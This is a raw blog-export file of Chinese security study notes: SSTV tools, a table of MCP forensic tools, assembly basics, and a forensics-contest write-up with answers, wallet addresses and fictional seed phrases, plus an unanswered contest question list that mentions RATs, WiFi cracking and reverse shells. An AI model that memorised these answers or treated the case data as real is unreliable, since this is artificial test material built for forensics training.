RX-SSTV解码软件\n下载地址：https://www.qsl.net/on6mu/rxsstv.htm\n虚拟声卡e2eSoft\n由于SSTV工具是根据音频传递图片信息，正常解法需要一台设备播放一台设备收音，所以需要一个虚拟声卡，还能避免杂音的干扰。\n下载地址：https://www.e2esoft.cn/vsc/\n![alt text](/img/misc-笔记_sstv.jpeg)\n\n\n## 参考\n- sq笔记\n- <https://blog.csdn.net/qq_45894840/article/details/128346180>","tags":["misc"],"categories":["知识点笔记"]},{"title":"本地模型在cherry中mcp使用技巧","url":"/2025/11/08/本地模型在cherry中mcp使用技巧/","content":"# 基础技巧\n- **excecute + 功能名称（别名）**\n\n### lovelymem mcp\n\n| 服务 | 功能名称（别名） | 调用名 | 作用说明 |\n|---|---|---|---|\n| lovelymem | `query_processes` | `mcp_lovelymem_query_processes` | 在进程列表文件（`pslist`、`pstree`）中查询特定进程，支持按 `PID`、进程名、父进程过滤。 |\n| lovelymem | `get_column_stats` | `mcp_lovelymem_get_column_stats` | 【推荐第三步】快速统计 CSV 指定列的唯一值分布与数值统计，用于发现异常值与分布特征。 |\n| lovelymem | `list_memprocfs_directory` | `mcp_lovelymem_list_memprocfs_directory` | 浏览 MemProcFS 挂载目录结构（如 `/forensic/files`、`/sys/proc`），支持递归与过滤。 |\n| lovelymem | `csv_quick_query` | `mcp_lovelymem_csv_quick_query` | 【CSV专用】快速查看 CSV 前/后/随机行，支持选择列与显示行号。 |\n| lovelymem | `read_memprocfs_file` | `mcp_lovelymem_read_memprocfs_file` | 读取 MemProcFS 中的文件内容（文本/二进制/十六进制），可设置偏移与最大读取大小。 |\n| lovelymem | `list_output_files` | `mcp_lovelymem_list_output_files` | 列出 `output_path` 目录中的分析结果文件（CSV、JSON、TXT），含大小/类型/修改时间。 |\n| lovelymem | `csv_sort` | `mcp_lovelymem_csv_sort` | 【CSV专用】按指定列排序并返回前 N 行，支持数字/文本排序与升降序。 |\n| lovelymem | `list_volatility_plugins` | `mcp_lovelymem_list_volatility_plugins` | 【Volatility】列出 Volatility 2/3 的可用插件列表，便于选择分析功能。 |\n| lovelymem | `read_analysis_file` | `mcp_lovelymem_read_analysis_file` | 读取 CSV/JSON/TXT，支持关键词/正则/列选择/条件过滤/分页与统计；用于精准抽取数据。 |\n| lovelymem | `csv_group_by` | `mcp_lovelymem_csv_group_by` | 【CSV专用】按列分组并进行计数/求和/平均/最小/最大等聚合，支持按计数降序。 |\n| lovelymem | `search_in_output` | `mcp_lovelymem_search_in_output` | 在所有输出文件中全局搜索字符串/正则/IP/哈希，支持上下文与文件过滤。 |\n| lovelymem | `inspect_file_structure` | `mcp_lovelymem_inspect_file_structure` | 【推荐第二步】快速检查文件结构（CSV 列名与行数、JSON 类型、文本行数），判断是否需要分页或过滤。 |\n| lovelymem | `search_memprocfs_files` | `mcp_lovelymem_search_memprocfs_files` | 在 MemProcFS 中按文件名或内容搜索关键字，支持大小写与最大文件大小限制。 |\n| lovelymem | `get_app_variables` | `mcp_lovelymem_get_app_variables` | 获取当前 MCP 的关键路径与配置（当前镜像、输出目录、Volatility/MemProcFS/脚本路径等）。 |\n| lovelymem | `execute_volatility_command` | `mcp_lovelymem_execute_volatility_command` | 【Volatility】执行 vol2/vol3 插件命令（支持参数与输出格式），在当前镜像上获取取证结果。 |\n| Redis | `set` | `mcp_Redis_set` | 设置键值（可选过期时间），用于临时存储分析状态或结果索引。 |\n| Redis | `get` | `mcp_Redis_get` | 读取键值，用于跨步骤复用中间结果。 |\n| Redis | `delete` | `mcp_Redis_delete` | 删除一个或多个键，清理临时数据。 |\n| Redis | `list` | `mcp_Redis_list` | 列出匹配模式的键，快速浏览当前缓存内容。 |\n| IDA MCP | `check_connection` | `mcp_ida-pro-mcp_check_connection` | 检查是否已连接到 IDA MCP。 |\n| IDA MCP | `get_metadata` | `mcp_ida-pro-mcp_get_metadata` | 获取当前 IDB 的元数据（文件名、基地址、大小、哈希等）。 |\n| IDA MCP | `get_function_by_name` | `mcp_ida-pro-mcp_get_function_by_name` | 通过函数名获取函数信息（地址、大小等）。 |\n| IDA MCP | `get_function_by_address` | `mcp_ida-pro-mcp_get_function_by_address` | 通过地址获取函数信息。 |\n| IDA MCP | `get_current_address` | `mcp_ida-pro-mcp_get_current_address` | 获取当前选中的地址。 |\n| IDA MCP | `get_current_function` | `mcp_ida-pro-mcp_get_current_function` | 获取当前选中的函数信息。 |\n| IDA MCP | `convert_number` | `mcp_ida-pro-mcp_convert_number` | 数字进制转换（十进制/十六进制等）。 |\n| IDA MCP | `list_functions` | `mcp_ida-pro-mcp_list_functions` | 列出数据库中的所有函数（分页）。 |\n| IDA MCP | `list_globals_filter` | `mcp_ida-pro-mcp_list_globals_filter` | 过滤并列出全局变量（支持正则/包含）。 |\n| IDA MCP | `list_globals` | `mcp_ida-pro-mcp_list_globals` | 列出所有全局变量（分页）。 |\n| IDA MCP | `list_imports` | `mcp_ida-pro-mcp_list_imports` | 列出所有导入符号（分页）。 |\n| IDA MCP | `list_strings_filter` | `mcp_ida-pro-mcp_list_strings_filter` | 过滤并列出字符串（支持正则/包含）。 |\n| IDA MCP | `list_strings` | `mcp_ida-pro-mcp_list_strings` | 列出所有字符串（分页）。 |\n","tags":["local ai","cherry studio"],"categories":["大模型笔记"]},{"title":"汇编语言学习笔记","url":"/2025/11/07/汇编语言学习笔记/","content":"## 什么是汇编语言\n- 汇编语言是最接近机器语言的编程语言，引用百科中的一段话解释为：\n  - 汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符代替机器指令的操作码，用地址符号或标号代替指令或操作数的地址。汇编语言又被称为第二代计算机语言。\n\n## 汇编语言产生的原因\n- 解决二进制编码的可读性问题。\n\n## 汇编与二进制的关系\n- 换句话来说，汇编语言就是把给机器看的二进制编码翻译成人话，汇编指令是机器指令的助记符，与机器指令是一一对应的关系，是一种便于阅读和记忆的书写格式。有效地解决了机器指令编写程序难度大的问题，并且使用编译器，可以很方便的把汇编程序转译成机器指令程序，\n\n## 寄存器\n- 说到汇编指令不得不提到寄存器，寄存器本身是用来存数据的，因为 CPU 本身只负责逻辑运算，数据需要单独储存在其他的地方，但是对于不熟悉寄存器的人来说会有疑惑，数据不是存在硬盘上吗？或者说数据不是存在内存中吗？这些想法都没错，那么寄存器是用来做什么的呢？\n\n## 寄存器作用\n- 其实硬盘、内存都是用来存储数据的，但是 CPU 的运算速度远高于内存的读写速度，更不用说从硬盘上取数据了，所以为了避免被拖慢速度影响效率，CPU 都自带一级缓存和二级缓存，一些 CPU 甚至增加了三级缓存，从这些缓存中读写数据要比内存快很多，但是还是无法使用飞速运转的 CPU，所以才会有寄存器的存在。\n\n- 寄存器不是后来增加的，在最初的计算中就已经设计出来，相比而言，多级缓存出现的更晚一些，通常那些最频繁读写的数据都会被放在寄存器里面，CPU 优先读写寄存器，再通过寄存器、缓存跟内存来交换数据，达到缓冲的目的，因为可以通过名称访问寄存器，这样访问速度是最快的，因此也被称为**零级缓存**。\n\n## 存取速度比较\n- 通过上面的叙述我们可以知道存取速度从高到低分别是: 寄存器 > 1级缓存 > 2级缓存 > 3级缓存 > 内存 > 硬盘，关于它们的存取速度，举个例子很容易就能明白了，比如我们做菜（CPU工作）时，取手中（寄存器）正拿着的肉和蔬菜肯定是最快的，如果没有就需要把案板上（1级缓存）处理好的菜拿过来，如果案板上没有就在更远一点的洗菜池（2级缓存）中找一找，还没找到的话就要到冰箱（3级缓存）中看一看了，这时发现家里真没有，那去楼下的菜店（内存）去买点吧，转了一圈发现没有想要的，最后还是开车去农贸市场（硬盘）买吧。\n\n- 通过上面这个例子应该能明白它们的速度关系了，既然缓存这么快，为什么不用缓存代替内存，或者将2、3级缓存都换成1级缓存呢？这里边有一个成本问题，速度越快对应着价格越高，如果你买过机械硬盘和固态硬盘应该很容易就理解了。\n\n## 寄存器分类\n- 常用的 x86 CPU 寄存器有8个：EAX 、EBX、ECX、EDX、EDI、ESI、EBP、ESP，据说现在寄存器总数已经超过100个了，等我找到相关资料再来补充，上面这几个寄存器是最常用的，这些名字也常常出现在汇编的代码中。\n\n- 我们常说的32位、64位 CPU 是指数据总线的宽度或根数，而寄存器是暂存数据和中间结果的单元，因此寄存器的位数也就是处理数据的长度与数据总线的根数是相同的，所以32位 CPU 对应的寄存器也应该是32位的。\n\n## 常用寄存器用途\n- 上面提到大8个寄存器都有其特定的用途，我们以32位 CPU 为例简单说明下这些寄存器的作用，整理如下表：\n\n|寄存器\t|含义\t|用途\t|包含寄存器|\n| :--: | :--: | :--: | :--: |\n|EAX\t|累加(Accumulator)寄存器\t|常用于乘、除法和函数返回值\t|AX(AH、AL)|\n|EBX\t|基址(Base)寄存器\t|常做内存数据的指针, 或者说常以它为基址来访问内存.\tBX(BH、BL)|\n|ECX\t|计数器(Counter)寄存器|\t常做字符串和循环操作中的计数器\t|CX(CH、CL)|\n|EDX\t|数据(Data)寄存器\t|常用于乘、除法和 I/O 指针|\tDX(DH、DL)|\n|ESI\t|来源索引(Source Index)寄存器\t|常做内存数据指针和源字符串指针\t|SI|\n|EDI\t|目的索引(Destination Index)寄存器|\t常做内存数据指针和目的字符串指针\t|DI|\n|ESP\t|堆栈指针(Stack Point)寄存器\t|只做堆栈的栈顶指针; 不能用于算术运算与数据传送\t|SP|\n|EBP\t|基址指针(Base Point)寄存器\t|只做堆栈指针, 可以访问堆栈内任意地址, 经常用于中转 ESP 中的数据, 也常以它为基址来访问堆栈; 不能用于算术运算与数据传送|\tBP|\n\n\n\n## 参考\n- <https://blog.csdn.net/albertsh/article/details/106041560>\n  - 版权声明：本文为CSDN博主「AlbertS」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/albertsh/article/details/106041560\n","tags":["ida","汇编"],"categories":["知识点笔记"]},{"title":"2024美亚杯团体赛wp","url":"/2025/11/06/2024美亚杯团体赛wp/","content":"## 说明\n- 时间情况只做了手机和个人赛检材部分\n- 祝我拖后腿概率downdowndown(≧∀≦)ゞ\n\n## 前情提要\n### 案情\n- 于 2024 月 9 月某日, 警方于香港湾仔调查一宗怀疑凶杀案件, 并拘捕了男子 David, 涉嫌因金钱问题杀害了其太太 Clara. 你对 David 的电子设备进行了取证检查, 怀疑他与其他三名成员 Alice, Ben 及 John 同属一个诈骗组织并进行不法勾当, 相信他们与案有关. 及后警方检取有关人士的手机和计算机等作进一步调查. 请分析以下的资料, 还原事件经过.\n### 资料\nAlice MacOS 系统计算器镜像档案 (Alice_Macbook.e01)\nAlice 的安卓手机镜像档案 (Alice_Mobile.bin)\nBen 的 Windows 系统计算器镜像档案 (Ben_Laptop.zip)\nBen 的 Windows 系统计算器分析档案 (BenAttachment.zip)\nBen 的 iOS 手机系统档案 (BeniPhone.zip)\nBen 的 U 盘镜像档案 (BenUSB.e01)\nBen 的 SD 咭镜像档案 (BenSDCard.e01)\nBen 跳转站镜像档案 (Ben_Jumpstation.zip)\nJohn 的 Windows 系统计算器镜像档案 (John_desktop.e01)\nJohn 的 iOS 手机系统备份文件(John_Smartphone_itunebackup.zip)\nJohn 的 NAS 盘镜像档案 1 (John_NAS_1.E01)\nJohn 的 NAS 盘镜像档案 2 (John_NAS_2.E01)\nJohn 的 VR 仪器镜像档案 (John_VR.zip)\n\n## Alice 的手机：在个人赛的最后一部分,你对David的数字设备进行了取证检查,发现他与一名成员Alice有可疑的沟通。你现在分析Alice 的手机。\n### 1. 参考Alice_Mobile.bin,Alice所使用的手机网络运营商公司的名称是什么?(答案格式: 请用大写英文字母作答 ，无须留空白)\n- 翻sim卡记录\n![alt text](/img/2024美亚杯团体赛wp_image.png)\n#### 2. 参考Alice_Mobile.bin,Alice 所使用的谷歌电子邮件地址是?(答案格式: 请用小写英文字母作答,例如:abc@google.com)\"\n- 。。。gmail原来是谷歌家的。。。蠢了\n- 最后从chrome浏览器找因为gmail有俩\n\n\n![alt text](/img/2024美亚杯团体赛wp_image-1.png)\n#### 3. 参考Alice_Mobile.bin,谁向Alice发送了一个含有个人资料的xlsx文件?\nA:David;\n**B:John;**\nC:Ben;\nD:Amy;\nE:Harry;\n![alt text](/img/2024美亚杯团体赛wp_image-3.png)\n![alt text](/img/2024美亚杯团体赛wp_image-2.png)\n#### 4. 承上题,参考Alice_Mobile.bin,该文件以MD5计算的哈希值是? (答案格式: 请用大写英文字母作答和用阿拉伯数字回答)\"\n- 5457d5a68673b8d093d7666d515cccb2\n- **5457D5A68673B8D093D7666D515CCCB2**\n#### 5. 参考Alice_Mobile.bin, Alice于Facebook(脸书)所建立的群组?\nA:大学生炒散搵工群;\nB:最全面搵工推介;\nC:全港笋工好工推介2024;\nD:搵工全职兼职;\nE:搵工WhatsApp群;\n![alt text](/img/2024美亚杯团体赛wp_image-4.png)\n- 这道题选项在搞事情, 除了正确选项剩下的都是繁体中文的原文, 虽然可以在检材中搜索到, 但并不是正确选项. 只有**真正的选项被写成了简体中文**(全港筍工好工推介2024), 检材中无法直接搜到\n- 可以记下来当知识点\n- Facebook 的群组英文并非 Group, 而是 Community.\n#### 6. 参考Alice_Mobile.bin, Alice在2024年8月15日于哪个地铁站和\"客服人员\"相约见面?\nA:Chai Wan;\nB:Tai Koo;\n**C:Wan Chai;**\nD:Central;\nE:Mong Kok;\n- 要记得简体，繁体，英文都搜一搜\n![alt text](/img/2024美亚杯团体赛wp_image-6.png)\n#### 7. 参考Alice_Mobile.bin,受骗女子欧凯被指示将虚拟货币转到哪个钱包地址?\n(答案格式: 大写英文字母, 小写英文字母及阿拉伯数字混合组成,例如: 0xDasdGJHI34twebGHJK2354YU34h)\n- 基本上題目有连贯性\n- 记得切换繁体搜一搜\n![alt text](/img/2024美亚杯团体赛wp_image-7.png)\n#### 8. 参考Alice_Mobile.bin, Alice指示\"客服人员\"使用什么交通工具离开香港?\nA:火车;\nB:私家车;\nC:飞机;\n**D:船;**\nE:货柜车;\n![alt text](/img/2024美亚杯团体赛wp_image-10.png)\n#### 9. [填空题]参考Alice_Mobile.bin，客服人员\"ZHANG WEI\"的银行卡号是多少？（答案格式:用阿拉伯数字回答， 例如: 54613165456431） （2分）\n![alt text](/img/2024美亚杯团体赛wp_image-9.png)\n#### 10. [单选题]参考Alice_Mobile.bin，Alice总共在脸书（FACEBOOK）上发布了多少张照片？（2分）\nA. 1\nB. 3\nC. 5\nD. 7\nE. 9\n- 存疑，跳过\n#### 11. [填空题]参考Alice_Mobile.bin，应用程序WhatsApp的数据库（database）内，哪个message_type代表发送的内容是表情包（Sticker）？\n![alt text](/img/2024美亚杯团体赛wp_image-11.png)\n\n#### 12. 参考Alice_Mobile.bin,在Alice手机中,哪一个数据库(Database)记录了照片的数据?(答案格式:只需使用全部大写回答, 例如:ABC.DB)\n![alt text](/img/2024美亚杯团体赛wp_image-12.png)\n- 注意大写回答\n\n#### 13. 承上题,参考Alice_Mobile.bin,该文件的最后修改日期和时间 (Last Modified Time) 是?(答案格式:YYYY-MM-DD HH:MM:SS)\n- 2024-08-30 17:28:29\n\n## 从Alice的手机中发现,她一直与一名叫John的成员保持联系,你接着分析John的手机｡参考John_Smartphone_itunebackup.zip, 备份密码是「1234」, 回答以下题目:\n#### 14. 在WhatsApp通讯软件内「三五成群」群组于什么时间创建?\nA:2024-08-29 17:44:38;\n**B:2024-07-25 15:22:09;**\nC:2024-07-30 12:45:50;\nD:2024-07-30 16:15:34;\n![alt text](/img/2024美亚杯团体赛wp_image-13.png)\n#### 15. 参考John_Smartphone_itunebackup.zip,照片IMG_0007 的创建日期时间是?\nA:2024年8月14日星期三下午02:54;\nB:2024年9月02日星期三下午12:54;\n**C:2024年8月14日星期三下午12:54;**\nD:2024年8月16日星期五下午12:54;\n![alt text](/img/2024美亚杯团体赛wp_image-14.png)\n- 切换视图！！！！\n#### 16. 参考John_Smartphone_itunebackup.zip,John曾使用什么通讯软件联系Ben?\nA:Reddit;\n**B:WhatsApp;**\nC:WeChat;\nD:Line;\n![alt text](/img/2024美亚杯团体赛wp_image-15.png)\n#### 17. 参考John_Smartphone_itunebackup.zip,于“三五成群”群中, 电子表格文件\"\"Personal_data.xlsx\"\"是由哪一个电话号码发送到该群组的?(答案格式:只需要用阿拉伯数字回答,包含国际电话区号和电话号码,例如:85290001111)\n![alt text](/img/2024美亚杯团体赛wp_image-16.png)\n- **85269711024**\n## 他与一个叫Ben的人有可疑的沟通｡你接着分析Ben的手机｡\n- passware kit解密解压后找到的manifest.plist文件得到备份密码\n![alt text](/img/2024美亚杯团体赛wp_image-17.png)\n- 但密码是0000。。。。我真没辙了\n#### 18. 参考BeniPhone.zip,根据 Ben 手机内通讯软件的记录,\"\"This is a RAT APK that allows us to control Android devices remotely, enabling data access, monitoring and manipulation through an interface\"\"是在什么时间接收或发出的?\"\nA:由 Ben 于 2024-08-02 16:17:07 接收;\n**B:由 Ben 于 2024-08-05 15:53:37 发出;**\nC:由 Ben 于 2024-08-05 16:58:12 接收;\nD:由 Ben 于 2024-08-05 17:22:47 发出;\n![alt text](/img/2024美亚杯团体赛wp_image-18.png)\n- 从Join那里看\n#### 19. 参考BeniPhone.zip,根据 Ben 手机内的照片记录,\"IMG_0011.PNG\"是通过哪种方式生成的?\nA:从互联网下载;\nB:手机拍摄;\n**C:手机截图;**\nD:以上皆不是;\n![alt text](/img/2024美亚杯团体赛wp_image-19.png)\n![alt text](/img/2024美亚杯团体赛wp_image-20.png)\n- grep再搜，出来俩数据库\n\n![alt text](/img/2024美亚杯团体赛wp_image-21.png)\n![alt text](/img/2024美亚杯团体赛wp_image-22.png)\n- SpringBoard 是 iOS 系统的截图组件, 也可以查看原图来判断\n#### 20. 你发现了该犯罪团伙似乎有一个共同的聊天群,其中包含有关可疑资本管理(与虚拟货币相关)的更多线索｡参考该聊天群组对话分析,John,David及Alice筹集资金的目的是什么?\nA:建立一个网站给人投资虚拟货币;\n**B:建立一个网站用作行骗;**\nC:创建虚拟货币钱包用作洗黑钱;\nD:写一个Android (APK)应用程序包用作沟通;\n![alt text](/img/2024美亚杯团体赛wp_image-23.png)\n#### 21. 参考該聊天群对话、David,Emma與Clara 的对话及IDFC的交易记录分析,哪一个虚拟货币地址储存John,David及Alice所筹集的IDFC?\nA:0xe90ad3f80e39e83b533eef3ed23c641ec51089c6;\nB:0x04d079c7ace663bbe1d2c201072d63b036d16ccd;\n**C:0x10a4f01b80203591ccee76081a4489ae1cd1281c;**\nD:0x8155c0b8a0c95424f433d8ab6342086f0433e6c4;\n- 个人赛95题\n\n![alt text](/img/2024美亚杯团体赛wp_image-24.png)\n- 还有聊天记录：\n\n![alt text](/img/2024美亚杯团体赛wp_image-25.png)\n- 去David电脑里面找，直接火眼里面导不出来，仿真看，所以比赛要个人赛后好好看内容，仿真也都不能删\n\n![alt text](../img/2024美亚杯团体赛wp_image-26.png)\n#### 22. 参考Alice_Mobile.bin,Alice 总共使用了多少个虚拟货币地址直接接收受害人的IDFC?\nA:1; \nB:3;\nC:6;\nD:7;\n![alt text](/img/2024美亚杯团体赛wp_image-27.png)\n- 不包括最前面就6个\n\n#### 23. [多选题] 參考David_Laptop.e01內找到的IDFC交易记录,在收取受害人的IDFC后,它之后会再流向哪些虚拟货币地址? (2分)\nA:0xb2e3dbea311511ec5bda3e85e061f15366f888a6;\n**B:0x70544880875fe907cee383873ca58da23378caa5;**\n**C:0x152c90200be61a540875f2a752c328bd19dbfb87;**\n**D:0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220;**\n- 上题剩下仨\n\n#### 24. [单选题] 承上题,上述IDFC去到那些地址后,谁掌管这些IDFC? (提示:分析IDFC的交易记录及个人赛所搜集的证据) (2分)\nA. Alice（回復種子：pumpkin fold behind captain shoulder demand print hospital like smoke gate weird）\nB. Ben（回復種子：wrap muscle rhythm stamp bundle zebra gorilla shuffle common tattoo ginger awake）\nC. John（回復種子：abandon among anxiety pizza evidence face quiz ripple nerve pact nasty unveil）\nD. David（回復種子：stock avocado grab clay light sadness segment ancient toe talk elder oil）\n- 结合个人赛David钱包被盗，就能选出来了\n\n#### 25.[单选题]2024年9月，Tom Victor带同其秘书Amy来到警署报案，称其秘书被骗子用人工智能视频在2024年8月29日早上骗去10，000，000 IDFC，清找出该交易的交易哈希（ransaction Hash）？（2分）\n**A. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d**\nB.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792a\nC.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d\nD.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792c\n- 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d\n- csv文件用excel打开找到\n\n\n","tags":["wp"],"categories":["wp","知识点笔记"]},{"title":"数证","url":"/2025/11/05/数证/","content":"# 服务器取证\n## 1、node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)（ ）\n\n## 2、集群配置了多少个node节点？（答案格式：1）（ ）\n## 3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）（ ）\n## 4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（ ）\n## 5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（ ）\n## 6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（ ）\n## 7、发卡网站部署使用的镜像名称是？（答案格式：root/root）（ ）\n## 8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（ ）\n## 9、发卡网站使用的缓存数据库是？（答案格式：mysql）（ ）\n## 10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）（ ）\n## 11、Telegram群管机器人配置的API代理域名是？（答案格式：[www.xxx.com](https://yuanbao.tencent.com/chat/naQivTmsDa/www.xxx.com)）（ ）\n## 12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（ ）\n## 13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（ ）\n##  \n## 14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（ ）\n##  \n## 15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（ ）\n##  \n## 16、发卡网站的后台访问路径是？（答案格式：/root）（ ）\n## 17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（ ）\n## 18、发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）（ ）\n##  \n## 19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）（ ）\n##  \n## 20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（ ）\n# 流量包分析\n## 21、黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）（ ）\n## 22、黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）（ ）\n## 23、黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）（ ）\n## 24、黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）（ ）\n## 25、黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）（ ）\n## 26、黑客通过修改路由器设置，将被劫持的域名为（答案格式：[www.xxx.com](https://yuanbao.tencent.com/chat/naQivTmsDa/www.xxx.com)）（ ）\n## 27、黑客在路由器管理后台发现FTP服务配置，FTP登录密码为？（答案格式：请按实际值填写）（ ）\n## 28、黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）（ ）\n## 29、黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）（ ）\n## 30、黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)（ ）\n# APK程序分析\n## 31、apk 的版本名称为？ （答案格式：1.1.1）（ ）\n## 32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（ ）\n## 33、apk运行后getVer()的返回值是多少？（答案格式：1.0.0）（ ）\n## 34、apk运行后需要通过一个http get请求才能打开第二个界面，给出该请求URL？ （答案格式：[http://www.xxx.com/test?a=1](http://www.xxx.com/test?a=1)）（ ）\n##  \n## 35、apk第二界面的8位授权码是什么？ （答案格式：11111111）（ ）\n##  \n# 二进制程序分析\n## 36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（ ）\n## 37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（ ）\n## 38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（ ）\n## 39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（ ）\n## 40、6c051a72b91a1.1文件解密后的md5值后六位是多少？（字母全大写，答案格式：AAAAAA）（ ）\n##  \n# 计算机取证分析\n## 41、操作系统的Build版本号是？（答案格式：1）（ ）\n\n\n## 42、操作系统设置的账户密码最长存留期为多少天？（答案格式：1）（ ）\n\n\n## 43、用户2登陆密码NT哈希值后六位是？（字母全大写，答案格式：AAAAAA）（ ）\n## 44、蓝牙mac地址是多少？（答案格式：AA-AA-AA-AA-AA-AA）（ ）\n## 45、SafeImager的产品序列号后四位是？（字母全大写，答案格式：AAAAAA）（ ）\n## 46、123.VHD所处的结束扇区是？（答案格式：1 ）（ ）\n## 47、用户在BitLocker加密分区最后修改的文件是?（答案格式：abcd.txt）（ ）\n## 48、用户连接192.168.114.129时用的会话名称是？（答案格式：按照实际情况填写）（ ）\n## 49、用户创建存储虚拟币钱包地址页面的时间是？（使用双位数格式，答案格式：01月01日）（ ）\n## 50、用户的虚拟币钱包地址是？（答案格式：按照实际情况填写）（ ）\n## 51、用户VC加密容器的密码是？（答案格式：按照实际情况填写）（ ）\n## 52、用户在生活中使用的代号是？（答案格式：按照实际情况填写）（ ）\n## 53、李安东的银行卡归属哪个银行？（答案格式：农业银行）（ ）\n## 54、请分析某市10月6日最高气温是？（答案格式：1）（ ）\n##  \n## 55、用户的BitLocker密码是？（答案格式：按照实际情况填写）（ ）\n##  \n## 56、用户办公室的门禁密码是？（答案格式：按照实际情况填写）（ ）\n## 57、用户使用的以D开头的解密程序的MD5值后六位是？（字母全大写，答案格式：AAAAAA）（ ）\n## 58、木马程序运行至系统断点前加载了几个动态链接库？（答案格式：1）（ ）\n##  \n## 59、木马产生的程序名称是什么？（答案格式：abcd.txt）（ ）\n## 60、木马尝试访问的域名是什么？（答案格式：按照实际情况填写）（ ）\n## 61、分析计算机内存检材，此内存镜像制作时的系统时间是？（使用双位数格式，答案格式：01月01日）（ ）\n## 62、分析计算机内存检材，用户Yiyelin的用户表示后4位是？（答案格式：1111）（ ）\n## 63、分析计算机内存检材，计算机的CPU型号是什么？（答案格式： i9-1110U）（ ）\n## 64、分析计算机内存检材，wps.exe的PID是？（答案格式：1）（ ）\n## 65、分析计算机内存检材，此计算机开机自启动的远控软件名称是？（答案格式：abcd.txt）（ ）\n# 物联网设备取证分析\n## 66、打印机的主机名称是什么？(答案格式：root)（ ）\n## 67、打印文件存储在哪个目录？(答案格式：/root/root)（ ）\n## 68、同一天，打印两份文件的用户是谁？(答案格式：root)（ ）\n## 69、分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）（ ）\n## 70、分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）（ ）\n## 71、分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）（ ）\n## 72、分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）（ ）\n## 73、根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）（ ）\n\n\n\n\n\n\n\n\n\n\n# 移动终端取证分析\n## 74、分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）（ ）\n- 17859628390\n- 8390\n## 75、分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）（ ）\n![alt text](/img/数证_image.png)\n## 76、找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）（ ）\n![alt text](/img/数证_image-1.png)\n## 77、分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）（ ）\n![alt text](/img/数证_image-2.png)\n- 85A51D\n## 78、手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）（ ）\n![alt text](/img/数证_image-3.png)\n## 79、找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）（ ）\n![alt text](/img/数证_image-4.png)\n## 80、找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）（ ）\n![alt text](/img/数证_image-5.png)\n## 81、分析出该组助记词正常顺序中最后一个单词（已知助记词1、助记词2、助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）（ ）【待】\n- movie unlock boost foil delay paddle obtain student electric quarter clerk segment\n\n![alt text](/img/数证_image-7.png)\n## 82、分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）（ ）\n![alt text](/img/数证_image-6.png)\n## 83、得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）（ ）\n![alt text](/img/数证_image-8.png)\n## 84、接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）（ ）\n- 